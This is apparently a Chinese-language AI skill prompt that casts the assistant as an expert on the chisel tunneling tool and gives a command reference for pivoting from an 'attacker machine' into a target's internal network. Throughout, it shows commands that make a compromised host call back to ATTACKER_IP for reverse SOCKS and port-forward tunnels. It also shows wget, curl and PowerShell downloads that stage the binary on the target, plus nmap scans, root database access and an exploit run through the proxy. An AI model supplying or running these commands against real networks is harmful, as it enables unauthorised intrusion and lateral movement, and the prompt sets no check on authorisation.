---
name: chisel
description: chisel — TCP/UDP 隧道与端口转发工具
---

你是 chisel 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# chisel — TCP/UDP 隧道与端口转发工具

## 基本信息

| 项目 | 内容 |
|------|------|
| 命令 | `chisel` |
| 路径 | 系统 PATH 直接可用 |
| 适用场景 | 内网穿透、SOCKS5 代理、端口转发、防火墙绕过 |

---

## 核心参数速查

### 服务端（攻击机）

| 参数 | 说明 |
|------|------|
| `server` | 服务器模式 |
| `-p <port>` | 监听端口 |
| `--reverse` | 允许反向端口转发（客户端建立隧道） |
| `--socks5` | 启用 SOCKS5 代理 |
| `--auth <user:pass>` | 设置认证 |
| `--host <ip>` | 监听 IP（默认 0.0.0.0） |
| `--key <file>` | TLS 私钥 |
| `--tls-domain <domain>` | TLS 域名 |

### 客户端（目标机）

| 参数 | 说明 |
|------|------|
| `client` | 客户端模式 |
| `<server>` | 服务器地址（`IP:PORT`） |
| `<tunnels>` | 隧道定义（见下方格式） |
| `--auth <user:pass>` | 连接认证 |
| `--keepalive <dur>` | 保持连接间隔 |
| `--max-retry-count <n>` | 最大重试次数 |
| `--max-retry-interval <dur>` | 最大重试间隔 |
| `--proxy <url>` | 通过代理连接服务端 |
| `--tls-skip-verify` | 跳过 TLS 验证 |
| `--fingerprint <fp>` | 验证服务器指纹 |

---

## 隧道定义格式

```
# 正向转发（客户端监听，转发到本地）
LOCAL_PORT:REMOTE_HOST:REMOTE_PORT

# 反向转发（服务端监听，转发到目标内网）
R:SERVER_PORT:TARGET_HOST:TARGET_PORT

# SOCKS5 代理
socks
R:socks
```

---

## 典型使用场景

### 场景 1：SOCKS5 内网穿透代理（最常用）

**攻击机（服务端）：**
```bash
chisel server -p 1080 --reverse --socks5
```

**目标机（客户端）：**
```bash
./chisel client ATTACKER_IP:1080 R:socks
```

**使用代理（攻击机）：**
```bash
# 配置 proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# 通过代理访问内网
proxychains4 nmap -sT -p 80,443,22 192.168.1.1
proxychains4 curl http://192.168.1.100
proxychains4 ssh user@192.168.1.100
```

---

### 场景 2：正向端口转发（本地端口映射到目标）

**攻击机（服务端）：**
```bash
chisel server -p 8080 --reverse
```

**目标机（客户端），将攻击机的 3306 流量转发到内网数据库：**
```bash
./chisel client ATTACKER_IP:8080 R:3306:192.168.1.100:3306
```

**攻击机直接连接内网 MySQL：**
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```

---

### 场景 3：将目标机某端口映射到攻击机

**攻击机（服务端）：**
```bash
chisel server -p 9999 --reverse
```

**目标机（将内网 192.168.1.10:80 映射到攻击机 8888 端口）：**
```bash
./chisel client ATTACKER_IP:9999 R:8888:192.168.1.10:80
```

**攻击机访问：**
```bash
curl http://127.0.0.1:8888
```

---

### 场景 4：正向隧道（不需要反向连接）

**目标机（服务端）：**
```bash
./chisel server -p 8888 --socks5
```

**攻击机（客户端）：**
```bash
chisel client TARGET_IP:8888 socks
```

**攻击机通过代理访问目标内网：**
```bash
proxychains4 nmap -sT 192.168.1.0/24
```

---

### 场景 5：多跳内网穿透

```bash
# 场景：攻击机 → 目标A（有公网）→ 内网B（无公网）

# 攻击机启动服务端
chisel server -p 2222 --reverse

# 目标A连接攻击机，建立 SOCKS 代理
./chisel client ATTACKER_IP:2222 R:1080:127.0.0.1:1080 &
./chisel server -p 3333 --socks5 --reverse &

# 目标B（通过目标A中转）连接目标A
./chisel client TARGET_A_IP:3333 R:socks

# 攻击机通过双重代理访问更深内网
```

---

## 传输 chisel 到目标机

```bash
# 攻击机：开启 HTTP 服务
python3 -m http.server 8000

# 目标机（Linux）下载
wget http://ATTACKER_IP:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel

# 目标机（Windows，PowerShell）
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/chisel.exe" -OutFile "C:\Windows\Temp\chisel.exe"

# 通过 curl
curl -o /tmp/chisel http://ATTACKER_IP:8000/chisel
chmod +x /tmp/chisel
```

---

## proxychains4 配置

```bash
# 编辑配置文件
vim /etc/proxychains4.conf

# 添加代理（在文件末尾）：
# SOCKS5 代理
socks5  127.0.0.1 1080

# 多跳代理链
socks5  127.0.0.1 1080
socks5  127.0.0.1 1081

# 使用方式
proxychains4 -q nmap -sT -p 1-1000 192.168.1.1
proxychains4 -q curl http://192.168.1.100/
proxychains4 -q ssh root@192.168.1.50
proxychains4 -q python3 exploit.py
```

---

## 与 ligolo-ng 对比

| 特性 | chisel | ligolo-ng |
|------|--------|-----------|
| 安装 | 单二进制 | 需要 proxy + agent |
| 路由支持 | 无（需 proxychains） | 系统路由（透明） |
| 性能 | 良好 | 更高 |
| 适用场景 | 简单端口转发/SOCKS | 完整内网路由 |
| Windows 支持 | 是 | 是 |
